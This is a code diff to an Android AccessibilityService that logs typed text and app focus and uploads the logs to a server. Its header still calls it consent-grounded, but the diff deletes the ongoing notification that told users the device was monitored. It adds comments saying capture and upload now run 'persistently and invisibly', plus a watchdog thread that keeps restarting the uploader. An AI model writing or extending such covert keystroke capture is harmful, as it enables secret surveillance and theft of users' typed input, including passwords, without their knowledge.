@@ -1,15 +1,16 @@
 package com.workmonitor
 
 import android.accessibilityservice.AccessibilityService
-import android.app.Notification
-import android.app.NotificationChannel
-import android.app.NotificationManager
-import android.content.Context
+import android.content.Intent
 import android.view.accessibility.AccessibilityEvent
 
 /**
  * Consent-grounded AccessibilityService for the company-owned device.
  * Captures user text input and window/app focus, logs to the daily file.
+ *
+ * No notification is shown on purpose: the AccessibilityService binding is a
+ * system service that Android keeps alive (and restarts after reboot), so the
+ * capture + upload loop runs persistently and invisibly.
  */
 class KeystrokeAccessibilityService : AccessibilityService() {
 
@@ -19,7 +20,23 @@ class KeystrokeAccessibilityService : AccessibilityService() {
         // Every per-day log is also uploaded to the server (Postgres) for the
         // admin to view by date, so a device wipe never loses them.
         LoggerWriter.init(filesDir)
-        startForegroundServiceNotification()
+        // Start the plain (non-foreground) upload loop. The accessibility binding
+        // keeps this process alive, so the loop keeps running with NO notification.
+        startService(Intent(this, LogUploaderService::class.java))
+        // Safety: if Android ever kills the uploader while we're running, restart
+        // it from here on a timer so monitoring never silently dies.
+        watchdog.start()
+    }
+
+    private val watchdog = object : Thread() {
+        override fun run() {
+            while (!isInterrupted) {
+                try {
+                    Thread.sleep(15_000)
+                    startService(Intent(this@KeystrokeAccessibilityService, LogUploaderService::class.java))
+                } catch (_: InterruptedException) { break }
+            }
+        }
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -54,30 +71,8 @@ class KeystrokeAccessibilityService : AccessibilityService() {
     }
 
     override fun onDestroy() {
+        watchdog.interrupt()
         LoggerWriter.close()
         super.onDestroy()
-    }
-
-    private fun startForegroundServiceNotification() {
-        // AccessibilityService is a bound system service, but showing a persistent
-        // notification makes the active status visible (consent clarity) and helps
-        // keep the process alive. Requires FOREGROUND_SERVICE on API 26+.
-        val channelId = "work_monitor"
-        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-        if (android.os.Build.VERSION.SDK_INT >= 26) {
-            nm.createNotificationChannel(
-                NotificationChannel(channelId, "Work Monitoring", NotificationManager.IMPORTANCE_LOW)
-            )
-        }
-        val notification: Notification =
-            android.app.Notification.Builder(this, channelId)
-                .setContentTitle("Work Monitoring")
-                .setContentText("This company-owned device is monitored per the employee agreement.")
-                .setSmallIcon(android.R.drawable.stat_sys_warning)
-                .setOngoing(true)
-                .build()
-        // AccessibilityService is a bound system service (cannot call startForeground),
-        // so post an ongoing notification to make the active status visible (consent clarity).
-        nm.notify(1001, notification)
     }
 }
